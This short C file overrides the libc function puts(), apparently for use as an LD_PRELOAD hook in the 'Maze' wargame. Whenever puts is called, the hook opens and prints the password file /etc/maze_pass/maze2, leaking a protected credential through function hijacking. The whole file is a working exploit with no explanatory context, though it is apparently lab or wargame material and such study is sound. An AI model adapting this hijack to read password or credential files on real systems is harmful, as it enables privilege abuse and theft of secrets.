#define _GNU_SOURCE
#include<stdlib.h>
#include<dlfcn.h>
#include<stdint.h>
#include<stdio.h>

int puts ( const char * str ) {
        FILE* fptr = fopen("/etc/maze_pass/maze2", "r");
        char ch = fgetc(fptr);
        while (ch != EOF) {
                printf("%c", ch);
                ch = fgetc(fptr);
        }
        fclose(fptr);
        printf("%s", str);
        return 0;
}
